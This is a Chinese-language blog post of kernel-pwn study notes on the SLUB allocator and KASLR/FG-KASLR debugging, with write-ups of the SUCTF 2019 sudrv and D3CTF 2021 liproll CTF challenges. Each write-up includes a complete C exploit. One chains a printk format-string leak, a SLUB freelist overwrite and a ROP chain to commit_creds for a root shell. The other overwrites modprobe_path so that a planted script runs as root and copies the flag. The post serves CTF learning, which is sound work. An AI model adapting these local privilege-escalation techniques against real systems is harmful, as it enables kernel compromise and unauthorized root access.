---
layout:     post
title:      kernel pwn入门之路（三）
subtitle:   开启slub副本|kaslr探索
date:       2021-11-18
author:     X1ng
header-img: kernel.jpg
catalog: true
tags:
    - kernel pwn
    - 学习笔记
---

初步认识slub分配器的、学习一般kaslr题目的调试和利用思路

### slub

slub相关的内容：[ linux 内核 内存管理 slub算法 （一） 原理_卢坤的专栏-CSDN博客](https://blog.csdn.net/lukuen/article/details/6935068)

> 链接中所说的空闲对象的next指针是保存在对象的一定偏移处的，该偏移可以通过config定义（如ubuntu或centos中该偏移就不为0），在本题的内核文件中偏移为0

### SUCTF 2019 sudrv

只有bzImage、cpio文件系统和start.sh启动脚本

通过[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)将bzImage解压为vmlinux，寻找内核中的gadgets

题目注册了名为"meizijiutql"的设备

```shell
#! /bin/sh

qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr" \
-monitor /dev/null \
-nographic 2>/dev/null \
-smp cores=2,threads=1 \
-s \
-cpu kvm64,+smep
```

从启动脚本可以看到开启了kaslr、smep保护，不能直接跳转程序地址，使用内核地址则需要先泄露内核基地址

ioctl系统调用实现了三个功能

1. 调用kmalloc从slab申请内存
2. 调用printk将slab的内容输出到日志中，存在格式化字符串漏洞，并且从启动的日志中可以看到`kernel.dmesg_restrict = 0`，可以通过dmesg看到输出的内容
3. 调用kfree释放slab申请到的内存

并且write系统调用使用copy_user_generic_unrolled函数从用户态获取数据，没有长度限制

> copy_from_user是一个宏定义实现的，该宏中会检查copy的size

思路是利用printk泄露内核代码段地址和内核栈地址，利用write溢出写覆写slab中未分配的对象为内核栈地址，使用kmalloc将内核栈作为slab对象分配，在栈上填充ROP

**kalsr调试方法：**

在start.sh脚本中修改kaslr为noaslr，但是在启动的时候模块加载地址还是随机的

在init文件中设置sh为root权限后

查看驱动加载地址

```
lsmod
```

查看内核基地址：

```
head /proc/kallsyms
```

通过程序加载地址加ida中的偏移可以下断点进行调试

在ropper或objdump出来的gadgets中找到的gadget是以0xffffffff81000000为基地址的，计算好偏移在泄露地址后通过偏移计算真实地址

![](https://tva1.sinaimg.cn/large/008i3skNly1gw20viei32j30qo0660tx.jpg)

**细节**

1. 由于每次调用kmalloc时的freelist指向的对象都是随机的，不像用户态的堆地址初始化的地址都是固定的，有时候第一个空闲的对象的next指针指向的地址偏移过于遥远，所以在溢出进行利用之前可以申请非常多的对象从而导致partial链表中没有可分配的对象，必须从伙伴系统申请新的slab，此时分配到的slab中全是相邻的空闲对象，只需要溢出修改下一个相邻对象的next指针即可实现任意地址分配

   > 借用参考资料中的两张图表示

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gw20xwfde9j30sg0g3mye.jpg)

   ![](https://tva1.sinaimg.cn/large/008i3skNly1gw20wu8esuj30sg0e1wfj.jpg)

   

2. 在格式化字符串泄露地址时printk有缓冲区，在缓冲区满的时候才会将数据写入系统日志中，exp中用两次printk的数据填满缓冲区后才能通过dmesg指令看到地址

3. 在较高版本的内核中没有了操作cr4的gadget，不能通过直接操作cr4寄存器来关闭smep保护，在内核栈中直接进行ROP利用

4. 在ropper中搜索并没有找到类似于`mov rdi,rax`这样的指令，而由于使用objdump导出的gadgets过于数量庞大，在文本编辑器中搜索的方法也失效了，根据Mask师傅的博客找到如下gadget，只需要在使用之前将rcx置为0即可稳定ret

   ```
   pwndbg> x/20i 0xffffffff9bb8e1f6
      0xffffffff9bb8e1f6:	mov    rdi,rax
      0xffffffff9bb8e1f9:	cmp    rcx,rsi
      0xffffffff9bb8e1fc:	ja     0xffffffff9bb8e1e9
      0xffffffff9bb8e1fe:	ret    
   ```

5. 在较高版本内核中存在KPTI(Kernel page-table isolation)保护，在用户空间执行代码时候会报段错误，所以注册段错误signal的handle函数为shell函数，即可在段错误的时候拿到shell

   ```c
   #include <signal.h>
   signal(SIGSEGV, shell);
   ```

6. 在进行溢出时使用的对象为0x10大小的时候获得的shell最稳定（在使用0x80左右的对象时获得shell后执行系统调用很容易崩溃），可能的原因是0x10大小的对象很少被使用

exp：

```c
#include <stdio.h> 
#include <pthread.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <sys/ioctl.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <sys/wait.h>
#include <fcntl.h> 
#include <signal.h>

#define SIZE 0x10

#define KERNCALL __attribute__((regparm(3))) 

void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0x81790; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0x81410; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
	system("/bin/sh");
	exit(0);
}

int get()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq %0;"
		"pushq %1;"
		"pushq %2;"
		"pushq %3;"
		"pushq $shell;"
		"pushq $0;"
		"swapgs;"
		"popq %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}


char buf[] = "%lx.%lx.%lx.%lx.%lx.%x.%lx.%lx.%lld.%lld.%lx.%x";
int main()
{
	signal(SIGSEGV, shell);
	save_stat();
	printf("[+]open drive\n");
	int fd = open("/dev/meizijiutql",2);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}

	int ret = 1;
	ret = ioctl(fd,0x73311337,0x100);
    ret = write(fd, buf, sizeof(buf));
	
	ret = ioctl(fd,0xDEADBEEF,0);
	ret = ioctl(fd,0xDEADBEEF,0);
	
	system("echo `dmesg | tail -1 | cut -f 2 -d ']' | cut -f 9 -d '.'` > func");
    system("echo `dmesg | tail -1 | cut -f 2 -d ']' | cut -f 10 -d '.'` > stack");
    
    char funcbuf[0x20], stackbuf[0x20];
    memset(funcbuf,0,0x20);
    memset(stackbuf,0,0x20);
    int funcfd = open("./func",2);
    int stackfd = open("./stack",2);
    read(funcfd,funcbuf,0x20);
    read(stackfd,stackbuf,0x20);
	long unsigned int func = atol(funcbuf);
	long unsigned int stack = atol(stackbuf)-0x68-0x20;

	size_t base = func - 0x129a268;
	printf("func: 0x%lx\nprepare_kernel_cred: 0x%lx\ncommit_creds: 0x%lx\nstack: 0x%lx\n", 
	func, (size_t)prepare_kernel_cred+base, (size_t)commit_creds+base, stack);
	
	for(int i=0; i<0x20; i++){
		ret = ioctl(fd,0x73311337,SIZE);
		printf("%d ",ret);
	}
	size_t data[SIZE/8+1];
	data[SIZE/8]=stack;
	write(fd,data,sizeof(data));
	
	ret = ioctl(fd,0x73311337,SIZE);
	printf("%d ",ret);
	ret = ioctl(fd,0x73311337,SIZE);
	printf("%d ",ret);

#define pop_rdi_ret 0x1388//0xffffffff81001388
#define mov_rax_rdi 0x38e1f6//0xffffffff81195ef6
#define pop_rbp 0x4ee
#define swapgs_popfq_ret 0xa00d5a//0xffffffff81a00d5a
#define iretq 0x925696//0xffffffff81021762
#define pop_rcx 0x674ff//0xffffffff81044f17

	size_t rop[0x100];
	memset(rop,0,0x100);
	int i = 0;
	rop[i++] = base+(pop_rdi_ret);
	rop[i++] = 0;
	rop[i++] = base+(prepare_kernel_cred);
	rop[i++] = base+(pop_rcx);
	rop[i++] = 0;
	rop[i++] = base+(mov_rax_rdi);
	rop[i++] = base+(commit_creds);
	rop[i++] = base+(swapgs_popfq_ret);	// swapgs; popfq; ret
	rop[i++] = user_rflags;			// rflags
	rop[i++] = base+(iretq);		// iretq; ret;
	rop[i++] = (size_t)&shell;

	rop[i++] = user_cs;		// cs
	rop[i++] = user_rflags;	// rflags
	rop[i++] = user_sp;		// rsp
	rop[i++] = user_ss;		// ss

	ret = write(fd, rop, 0x100);
	printf("%d ",ret);
	return 0;
}
```



### D3CTF 2021 liproll

查看启动脚本

```shell
#!/bin/sh

qemu-system-x86_64 \
        -kernel ./bzImage \
        -append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" \
        -initrd ./rootfs.cpio \
        -nographic \
        -m 2G \
        -smp cores=2,threads=2,sockets=1 \
        -monitor /dev/null
```

开启了kaslr，并且在编译的时候使用了fg_kaslr，在函数粒度上进行随机化，也就是大多数函数加载到的地址都是随机的

分析ko文件，题目文件用一个列表来存放申请的内核堆地址，将idx放到global_buffer全局变量后可以进行读写操作，读写操作会先将global_buffer中的内容放到栈上，再对栈进行读写，释放选项直接清空地址而不释放内存

漏洞在于写操作的时候没有限制输入的长度，可能导致栈溢出，并且写操作最后会将栈上的指针赋值给global_buffer保存global_buffer，所以实际上可以实现任意地址读写

利用思路：

1. 可以通过读栈上的内存来泄露地址和canary，虽然很多地址由于fg_kaslr的原因并不能用于计算gadget偏移，但还是有一部分地址是不受fg_kaslr的影响的可以通过泄露的地址和canary，用一些不受fg_kaslr的gadget构造rop链，调用`commit_creds(prepare_kernel_cred(0));`进行提权
2. 也可以使用官方wp的做法，利用任意地址读dump出内存，再从内存中找到需要的gadget，根据偏移计算地址，然后ROP调用`commit_creds(prepare_kernel_cred(0));`进行提权
3. 不过有更简单的方法，由于可以实现任意地址写，直接将modprobe_path字符串修改为指定的路径，再在指定路径下存放修改flag权限的shell脚本，在内核解析elf文件失败时就会去调用modprobe_path这一路径的脚本，只需要构造一个假的elf文件去执行就能触发

漏洞调试：

修改权限为0后，找到__request_module函数地址

```
cat /proc/kallsyms | grep "__request_module"
```

找到该函数地址为`0xffffffffbb0d0e60`，并通过该函数的引用找到modprobe_path的地址：`0xffffffffbb848460`，该地址并不受fg_kaslr的影响

```c
pwndbg> x/20i 0xffffffffbb0d0e60
   0xffffffffbb0d0e60:	push   rbp
   0xffffffffbb0d0e61:	mov    rbp,rsp
   0xffffffffbb0d0e64:	push   r14
   0xffffffffbb0d0e66:	push   r13
   0xffffffffbb0d0e68:	push   r12
   0xffffffffbb0d0e6a:	mov    r12,rsi
   0xffffffffbb0d0e6d:	push   r10
   0xffffffffbb0d0e6f:	lea    r10,[rbp+0x10]
   0xffffffffbb0d0e73:	push   rbx
   0xffffffffbb0d0e74:	mov    r13,r10
   0xffffffffbb0d0e77:	mov    ebx,edi
   0xffffffffbb0d0e79:	sub    rsp,0xb0
   0xffffffffbb0d0e80:	mov    QWORD PTR [rbp-0x48],rdx
   0xffffffffbb0d0e84:	mov    QWORD PTR [rbp-0x40],rcx
   0xffffffffbb0d0e88:	mov    QWORD PTR [rbp-0x38],r8
   0xffffffffbb0d0e8c:	mov    QWORD PTR [rbp-0x30],r9
   0xffffffffbb0d0e90:	mov    rax,QWORD PTR gs:0x28
   0xffffffffbb0d0e99:	mov    QWORD PTR [rbp-0x60],rax
   0xffffffffbb0d0e9d:	xor    eax,eax
   0xffffffffbb0d0e9f:	test   dil,dil
pwndbg> 
   0xffffffffbb0d0ea2:	jne    0xffffffffbb0d1028
   0xffffffffbb0d0ea8:	cmp    BYTE PTR [rip+0x7775b1],0x0        # 0xffffffffbb848460
   0xffffffffbb0d0eaf:	je     0xffffffffbb0d1184
   0xffffffffbb0d0eb5:	lea    rax,[rbp-0x58]
   0xffffffffbb0d0eb9:	lea    rcx,[rbp-0xb0]
   0xffffffffbb0d0ec0:	mov    rdx,r12
   0xffffffffbb0d0ec3:	mov    esi,0x38
   0xffffffffbb0d0ec8:	lea    rdi,[rbp-0x98]
   0xffffffffbb0d0ecf:	mov    QWORD PTR [rbp-0xa8],r13
   0xffffffffbb0d0ed6:	mov    DWORD PTR [rbp-0xb0],0x10
   0xffffffffbb0d0ee0:	mov    QWORD PTR [rbp-0xa0],rax
   0xffffffffbb0d0ee7:	call   0xffffffffbb1b0530
   0xffffffffbb0d0eec:	cmp    eax,0x37
   0xffffffffbb0d0eef:	ja     0xffffffffbb0d118f
   0xffffffffbb0d0ef5:	lea    rdi,[rbp-0x98]
   0xffffffffbb0d0efc:	call   0xffffffffbb162bc0
   0xffffffffbb0d0f01:	mov    r12d,eax
   0xffffffffbb0d0f04:	test   eax,eax
   0xffffffffbb0d0f06:	je     0xffffffffbb0d0f2d
   0xffffffffbb0d0f08:	mov    rax,QWORD PTR [rbp-0x60]
pwndbg> x/s 0xffffffffbb848460
0xffffffffbb848460:	"/sbin/modprobe"
pwndbg> x 0xffffffffbb848460-0xffffffffba60007c
0x12483e4:	<error: Cannot access memory at address 0x12483e4>
```

通过越界读漏洞，多次尝试可以找到一个最后三位不发生改变的地址

> [+] Leak address: 
> 0x593775c028a700
> 0x1
> 0x0
> 0xffffffff9fa97598
> 0xffff9204bc4ba400
> 0xffff9204bc4ba400
> 0x4c54a0
> 0x300
> 0x0
> 0x0
> 0xffffffff9ff6810a
> 0x0
> 0x593775c028a700
> 0x0
> 0xffffa00980197f58
> 0x0
> 0x0
> 0xffffffffa032acb3
> 0x0
> 0x0
> **0xffffffff9f80007c**
> 0x0

通过0xffffffff9f80007c可以计算内核基地址，之后计算出modprobe_path的地址，通过溢出漏洞任意地址写修改modprobe_path字符串即可

对于这种开启fg_kaslr的题目而言似乎只能在每次运行的时候通过gdb的x指令找到各个函数的偏移，再加上`lsmod`获得的基地址得到函数的真实地址来下断点调试，，，除此之外没有想更好的调试方法了（希望看到本文且有更好的方法的师傅留言带带弟弟）

另外需要注意的是伪造的modprobe_path脚本文件需要以"#!/bin/sh"开头

exp：

```c
#include <stdio.h> 
#include <pthread.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <sys/ioctl.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <sys/wait.h>
#include <fcntl.h> 
#include <signal.h>

#define SIZE 0x10

#define KERNCALL __attribute__((regparm(3))) 

void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0x81790; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0x81410; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
	system("/bin/sh");
	exit(0);
}

int get()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq %0;"
		"pushq %1;"
		"pushq %2;"
		"pushq %3;"
		"pushq $shell;"
		"pushq $0;"
		"swapgs;"
		"popq %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}

struct node{
	void *buf;
	unsigned int len;
};

int fd;

int add()
{
	return ioctl(fd,0xD3C7F03,0);
}

int cho(int idx)
{
	int *idxp = &idx;
	return ioctl(fd,0xD3C7F04,idxp);
}

int delete()
{
	return ioctl(fd,0xD3C7F02,0);
}

int edit(struct node *nodep)
{
	return ioctl(fd,0xD3C7F01,nodep);
}


char data[0x300];
int main()
{
	signal(SIGSEGV, shell);
	save_stat();
	
	
	system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag\n' > /tmp/chflag");
	system("chmod +x /tmp/chflag");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/aaa");
	system("chmod +x /tmp/aaa");
	
	printf("[+]open drive\n");
	fd = open("/dev/liproll",2);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}
	
	struct node node1;
	node1.buf = malloc(0x1000);
	node1.len = 0x108;
	
	add();
	cho(0);
	read(fd,data,0x300);
	printf("[+] Leak address: \n");
	for(int i=0x20;i<0x300/8;i++){
		printf("0x%lx\n",*((size_t *)data+i));
	}
	
    *((size_t *)node1.buf+0x20)=*((size_t *)data+0x20+20)+0x12483e4;
	edit(&node1);
	strcpy(node1.buf,"/tmp/chflag");
	node1.len = 0x10;
	edit(&node1);

	system("/tmp/aaa");
	return 0;
}
```





> 参考资料
>
> [ linux 内核 内存管理 slub算法 （一） 原理_卢坤的专栏-CSDN博客](https://blog.csdn.net/lukuen/article/details/6935068)
>
> [Kernel Pwn题目的实战 - Mask's blogs (mask6asok.top)](http://mask6asok.top/2020/02/06/kernel_challenge.html#2019-SUCTF-sudrv)
>
> [D3CTF-pwn-liproll详解 - 简书 (jianshu.com)](https://www.jianshu.com/p/6f6041093434)
>
> [2021-D3CTF | A1ex's Blog](https://a1ex.online/2021/03/06/2021-antCTF/)
>
> [D3CTF-2021-Exploits/exp.c at master · UESuperGate/D3CTF-2021-Exploits (github.com)](https://github.com/UESuperGate/D3CTF-2021-Exploits/blob/master/liproll/exp.c)
